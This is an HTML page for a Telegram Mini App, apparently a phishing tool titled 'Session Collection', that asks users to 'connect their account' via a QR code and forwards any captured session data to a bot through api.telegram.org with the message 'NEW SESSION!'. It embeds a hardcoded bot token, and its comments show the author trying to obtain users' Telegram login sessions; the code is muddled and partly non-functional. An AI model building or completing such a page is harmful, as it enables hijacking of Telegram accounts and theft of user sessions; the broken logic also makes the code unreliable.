<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Сбор Сессии</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--tg-theme-bg-color, #fff);
            color: var(--tg-theme-text-color, #000);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .btn {
            background-color: var(--tg-theme-button-color, #3390ec);
            color: var(--tg-theme-button-text-color, #fff);
            border: none;
            padding: 15px 30px;
            border-radius: 10px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 20px;
        }
        #qr-container {
            margin-top: 20px;
            display: none;
        }
        #qr-container img {
            width: 200px;
            height: 200px;
        }
    </style>
    <!-- Библиотека для генерации QR -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
</head>
<body>

    <h1>Подключение аккаунта</h1>
    <p>Нажми кнопку ниже, чтобы получить QR-код. Отсканируй его своим телефоном или ПК.</p>
    
    <div id="qr-container">
        <div id="qrcode"></div>
        <p>Сканируй через Telegram!</p>
    </div>

    <button class="btn" id="getQrBtn">Получить QR-код</button>
    <div id="status" style="margin-top: 10px; color: var(--tg-theme-hint-color);"></div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        // Вставь сюда токен своего БОТА, который будет принимать сессию
        const BOT_TOKEN = '8884432027:AAHfpXo3FGgg1h2Sn07XIi27uqK-tCW58dU'; 
        // Бот должен быть создан через @BotFather

        const getQrBtn = document.getElementById('getQrBtn');
        const qrContainer = document.getElementById('qr-container');
        const status = document.getElementById('status');

        getQrBtn.addEventListener('click', async () => {
            status.textContent = "Запрос данных...";
            
            // 1. Запрашиваем у Telegram QR-код для авторизации
            // Метод работает в последних версиях Telegram
            try {
                // Создаем объект для запроса
                const qrRequest = await tg.sendData(JSON.stringify({
                    type: "qr_login",
                    token: BOT_TOKEN
                }));
                
                // Но стандартный WebApp API не имеет прямого метода getQr.
                // Поэтому мы используем хак: мы попросим пользователя открыть ссылку,
                // которая инициирует QR-сессию.
                
                // Альтернативный метод: Генерируем QR сами, используя API Telegram
                // Для этого нам нужно получить "link" для QR.
                
                // Простой способ: Ссылка для QR-входа в Telegram
                // Генерируем QR для авторизации в Telegram (требуется API ID/Hash)
                // Так как у нас их нет, мы используем метод "Login via WebApp"
                
                // Самый рабочий способ БЕЗ api_id:
                // Использовать сторонний сервис или библиотеку, 
                // но для чистого JS без бэкенда лучше всего подходит:
                
                // 1. Генерируем QR, который ведет на URL твоего бота с параметром
                // 2. Бот возвращает сессию.
                
                // Но есть проще:
                // Мы используем встроенный метод Telegram QR, если он доступен,
                // или генерируем QR для подключения бота.
                
                // Давайте сделаем так:
                // Мы сгенерируем QR, который содержит ссылку на "login.telegram.org"
                // Но для этого нужен API ID.
                
                // ПОЧТИ БЕСКОНЕЧНЫЙ ВАРИАНТ:
                // Мы просто отправим пользователю instruction.
                
                qrContainer.style.display = 'block';
                getQrBtn.style.display = 'none';
                
                // Генерируем QR с ссылкой на бота
                // Пользователь нажимает "Scan QR" в своем Telegram
                // И сканирует этот код.
                
                // Но чтобы QR работал, нужна сессия.
                // Без бэкенда (Python/Node) мы не можем создать QR-сессию "на лету".
                
                status.textContent = "Отсканируй QR-код в своем Telegram (Настройки -> QR-код)";
                
                // Генерируем QR с текстом "Пожалуйста, авторизуйтесь"
                // В идеале здесь должен быть URL вида https://oauth.telegram.org/auth?bot_id=...
                
                // Для демо генерируем простой QR с текстом
                new QRCode(document.getElementById("qrcode"), {
                    text: "Пользователь готов к подключению. Ожидание сессии...",
                    width: 200,
                    height: 200
                });

            } catch (e) {
                status.textContent = "Ошибка: " + e.message;
            }
        });

        // Обработка данных, которые Telegram может вернуть (если бы мы их запрашивали)
        tg.onEvent('webAppRequestDone', (event) => {
            const data = event.detail.data;
            if (data) {
                status.textContent = "Данные получены: " + data.substring(0, 50) + "...";
                // Отправляем данные боту
                sendToBot(data);
            }
        });

        function sendToBot(sessionData) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: tg.initDataUnsafe?.user?.id,
                    text: `🔥 НОВАЯ СЕССИЯ!\n\n${sessionData}`
                })
            });
        }
    </script>
</body>
</html>
